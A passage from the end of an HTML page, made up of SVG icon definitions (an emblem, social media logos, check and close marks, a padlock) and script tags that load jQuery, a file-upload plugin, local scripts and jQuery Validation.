34.7 13.5 33.8 12.6 33.8 12.6 33.8 12.6 32.9 14.4 33.3 16.3 33.5 17 33.6 17.5 33.8 17.8 33.9 18 34 18.1 34.1 18.2 34.2 18.3 34.3 18.4 34.5 18.5 34.2 19.2 33.9 19.8 33.6 20.5 33.5 19.1 32.8 17.9 32.8 17.9 32.8 17.9 31.5 19.3 31.2 21.3 31.1 22 31.1 22.5 31.2 22.9 31.2 23 31.2 23.2 31.3 23.3L31.4 23.5C30.9 24.1 30.3 24.6 29.7 25.1 30.1 23.7 29.9 22.3 29.9 22.3 29.9 22.3 28.1 23.3 27.3 25 27 25.7 26.8 26.2 26.8 26.5 26.7 26.7 26.7 26.8 26.7 27L26.7 27.1C25.9 27.5 25.2 27.8 24.3 28 25.4 26.8 25.7 25.5 25.7 25.5 25.7 25.5 23.7 25.7 22.2 26.9 21.6 27.4 21.2 27.8 21 28.1 20.9 28.2 20.8 28.3 20.8 28.5 20.8 28.6 20.8 28.7 20.8 28.7 20.3 28.7 19.9 28.7 19.4 28.7L18.3 28.7C18.3 28.7 18.3 28.6 18.2 28.5 18.2 28.3 18.1 28.2 18 28.1 17.8 27.8 17.4 27.4 16.8 26.9 15.3 25.7 13.3 25.5 13.3 25.5 13.3 25.5 13.7 26.9 14.7 28.1 13.9 27.8 13.1 27.5 12.3 27.1L12.3 27C12.3 26.8 12.3 26.7 12.2 26.5 12.2 26.2 12 25.7 11.7 25 10.9 23.3 9.1 22.3 9.1 22.3 9.1 22.3 8.9 23.7 9.3 25.2 8.7 24.7 8.1 24.2 7.5 23.6 7.6 23.5 7.7 23.4 7.7 23.3 7.8 23.2 7.8 23 7.8 22.9 7.9 22.5 7.9 22 7.8 21.3 7.5 19.3 6.2 17.9 6.2 17.9 6.2 17.9 5.5 19.2 5.4 20.7 5 20 4.7 19.3 4.4 18.5 4.6 18.4 4.8 18.3 4.9 18.2 5 18.1 5.1 18 5.2 17.8 5.4 17.5 5.5 17 5.7 16.3 6.1 14.4 5.2 12.6 5.2 12.6 5.2 12.6 4.2 13.6 3.6 15.1 3.6 14.6 3.5 14 3.5 13.3L3.5 13C3.6 13 3.7 13 3.8 12.9 3.9 12.9 4.1 12.8 4.2 12.7 4.5 12.5 4.8 12.2 5.3 11.6 6.6 10 6.7 8.1 6.7 8.1 6.7 8.1 5.2 8.5 4 9.7 4.2 8.7 4.5 7.7 5 6.9L5.2 6.9C5.4 6.9 5.5 6.9 5.6 6.8 6 6.7 6.5 6.5 7.1 6.1 8.9 5 9.6 3.2 9.6 3.2 9.6 3.2 8 3.1 6.4 3.9 6.3 3.9 6.3 3.9 6.3 4 6.1 2.2 5.1 0.9 5.1 0.9 5.1 0.9 4 2.5 4 4.5 4 5.2 4.1 5.7 4.3 6.1 4.3 6.2 4.3 6.3 4.4 6.4 4.5 6.5 4.5 6.6 4.6 6.7 4.2 7.6 3.9 8.6 3.6 9.6 2.8 8.2 1.6 7.4 1.6 7.4 1.6 7.4 1.1 9.3 1.8 11.1 2.1 11.8 2.3 12.3 2.6 12.5 2.6 12.6 2.7 12.7 2.8 12.8L3.1 13 3.1 13.3C3.1 14 3.2 14.6 3.2 15.2 1.9 14.3 0.4 14.1 0.4 14.1 0.4 14.1 0.8 16 2.3 17.4 2.9 17.9 3.3 18.2 3.7 18.3 3.8 18.4 3.9 18.4 4 18.5 4.3 19.3 4.7 20.2 5.2 21 3.6 20.6 2.1 20.9 2.1 20.9 2.1 20.9 3.1 22.5 5 23.3 5.7 23.6 6.2 23.8 6.6 23.8 6.7 23.9 6.8 23.9 6.9 23.9 7 23.9 7.1 23.8 7.2 23.8L7.9 24.5C8.3 24.9 8.7 25.2 9.1 25.6 7.5 25.7 6.2 26.4 6.2 26.4 6.2 26.4 7.7 27.6 9.7 27.8 10.5 27.9 11 27.9 11.4 27.8 11.5 27.8 11.6 27.8 11.7 27.7L12 27.5 12.1 27.5C13 27.9 13.8 28.2 14.7 28.5 13.3 29.2 12.3 30.4 12.3 30.4 12.3 30.4 14.3 31 16.2 30.3 16.9 30.1 17.4 29.8 17.7 29.6 17.9 29.5 18 29.5 18 29.4 18.1 29.3 18.2 29.2 18.2 29.1 18.6 29.1 19 29.1 19.4 29.1 19.9 29.1 20.4 29.1 20.8 29.1 20.8 29.2 20.9 29.3 21 29.4 21 29.5 21.1 29.5 21.3 29.6 21.6 29.8 22.1 30.1 22.8 30.3 24.7 31 26.7 30.4 26.7 30.4 26.7 30.4 25.7 29.2 24.2 28.5 25.2 28.2 26 27.8 26.9 27.4 26.9 27.4 26.9 27.5 27 27.5L27.3 27.7C27.4 27.8 27.5 27.8 27.6 27.8 28 27.9 28.5 27.9 29.3 27.8 31.3 27.6 32.8 26.4 32.8 26.4 32.8 26.4 31.5 25.6 29.8 25.6L31 24.5C31.3 24.2 31.5 24 31.7 23.8 31.8 23.8 32 23.8 32.1 23.9 32.2 23.9 32.3 23.9 32.4 23.8 32.8 23.8 33.3 23.6 34.1 23.3 35.9 22.5 37 20.9 37 20.9L37 20.9Z"></path>
                </symbol>
                <symbol id="facebook-icon" viewBox="0 0 25 24">
                    <g style="fill:none;opacity:0.9">
                        <g fill="#FFF">
                            <path d="M24 22.5C24 23.2 23.5 23.8 22.8 23.8L16.8 23.8 16.8 14.8 19.9 14.8 20.3 11.3 16.8 11.3 16.8 9C16.8 8 17.1 7.3 18.6 7.3L20.4 7.3 20.4 4.2C20.1 4.2 19 4.1 17.7 4.1 15.1 4.1 13.2 5.7 13.2 8.7L13.2 11.3 10.2 11.3 10.2 14.8 13.2 14.8 13.2 23.8 2.1 23.8C1.4 23.8 0.8 23.2 0.8 22.5L0.8 1.8C0.8 1.1 1.4 0.5 2.1 0.5L22.8 0.5C23.5 0.5 24 1.1 24 1.8L24 22.5"></path>
                        </g>
                    </g>
                </symbol>
                <symbol id="twitter-icon" viewBox="0 0 24 21" version="1">
                    <defs></defs>
                    <g id="Desktop" style="fill-rule:evenodd;fill:none;opacity:0.9;stroke-width:1;stroke:none">
                        <g id="Desktop-All-Assets" fill="#FFF">
                            <g id="More-Details">
                                <g id="No-container">
                                    <g id="twitter">
                                        <path d="M23.3 1.2C22.4 1.8 21.4 2.2 20.3 2.4 19.4 1.4 18.1 0.8 16.7 0.8 14 0.8 11.8 3.1 11.8 5.8 11.8 6.2 11.9 6.6 12 6.9 7.9 6.7 4.3 4.8 1.9 1.7 1.5 2.5 1.3 3.3 1.3 4.2 1.3 6 2.1 7.5 3.4 8.4 2.7 8.4 1.9 8.1 1.2 7.8L1.2 7.8C1.2 10.2 2.9 12.3 5.1 12.7 4.7 12.8 4.3 12.9 3.9 12.9 3.6 12.9 3.2 12.9 2.9 12.8 3.6 14.8 5.4 16.2 7.5 16.3 5.8 17.6 3.7 18.4 1.5 18.4 1.1 18.4 0.7 18.4 0.3 18.3 2.4 19.8 5 20.6 7.7 20.6 16.7 20.6 21.6 13 21.6 6.4 21.6 6.2 21.6 6 21.6 5.7 22.5 5 23.3 4.2 24 3.2 23.1 3.6 22.2 3.8 21.2 3.9 22.2 3.3 23 2.4 23.3 1.2"
                                            id="Twitter"></path>
                                    </g>
                                </g>
                            </g>
                        </g>
                    </g>
                </symbol>
                <symbol id="instagram-icon" viewBox="0 0 24 24">
                    <g style="fill:none;opacity:0.9">
                        <g fill="#FFF">
                            <path d="M20.7 0.3L3 0.3C1.5 0.3 0.3 1.5 0.3 3L0.3 20.7C0.3 22.3 1.5 23.5 3 23.5L20.7 23.5C22.3 23.5 23.5 22.3 23.5 20.7L23.5 3C23.5 1.5 22.3 0.3 20.7 0.3L20.7 0.3ZM17 3.9C17 3.5 17.3 3.2 17.7 3.2L19.9 3.2C20.3 3.2 20.6 3.5 20.6 3.9L20.6 6.1C20.6 6.5 20.3 6.8 19.9 6.8L17.7 6.8C17.3 6.8 17 6.5 17 6.1L17 3.9 17 3.9ZM11.9 7.5C14.4 7.5 16.4 9.5 16.4 11.9 16.4 14.4 14.4 16.4 11.9 16.4 9.5 16.4 7.5 14.4 7.5 11.9 7.5 9.5 9.5 7.5 11.9 7.5L11.9 7.5ZM21.3 20.6C21.3 21 21 21.3 20.6 21.3L3.2 21.3C2.8 21.3 2.5 21 2.5 20.6L2.5 9.7 5.4 9.7C5 10.3 4.9 11.3 4.9 11.9 4.9 15.8 8 19 11.9 19 15.8 19 19 15.8 19 11.9 19 11.3 18.9 10.3 18.4 9.7L21.3 9.7 21.3 20.6 21.3 20.6Z"></path>
                        </g>
                    </g>
                </symbol>
                <symbol id="thin-x" viewBox="0 0 26 26">
                    <path d="M10.5 9.3L1.8 0.5 0.5 1.8 9.3 10.5 0.5 19.3 1.8 20.5 10.5 11.8 19.3 20.5 20.5 19.3 11.8 10.5 20.5 1.8 19.3 0.5 10.5 9.3Z"></path>
                </symbol>
                <symbol id="thin-check" viewBox="0 0 26 26">
                    <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                </symbol>
                <symbol id="secure-server-icon" viewBox="0 0 12 16">
                    <g fill="none">
                        <g fill="#FFB53F">
                            <path d="M8.4 5L8.4 6.3 10 6.3 10 5C10 2.8 8.2 1 6 1 3.8 1 2 2.8 2 5L2 6.3 3.6 6.3 3.6 5C3.6 3.7 4.7 2.6 6 2.6 7.3 2.6 8.4 3.7 8.4 5ZM11 7L11 15 1 15 1 7 11 7ZM6.5 11.3C7 11.1 7.3 10.6 7.3 10.1 7.3 9.3 6.7 8.7 6 8.7 5.3 8.7 4.7 9.3 4.7 10.1 4.7 10.6 5 11.1 5.5 11.3L5.2 13.4 6.9 13.4 6.5 11.3Z"></path>
                        </g>
                    </g>
                </symbol>
            </defs>
        </svg>
    </div>
    </div>
	
	<script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
	<script src="system/js/jquery.fileuploader.min.js" type="text/javascript"></script>
	<script src="system/js/index.js" type="text/javascript"></script>
	<script src="system/js/custom.js" type="text/javascript"></script>
	<script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/jquery.validate.min.js"></script>
	<script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/additional-methods.min.js"></script>
</body>

</html>






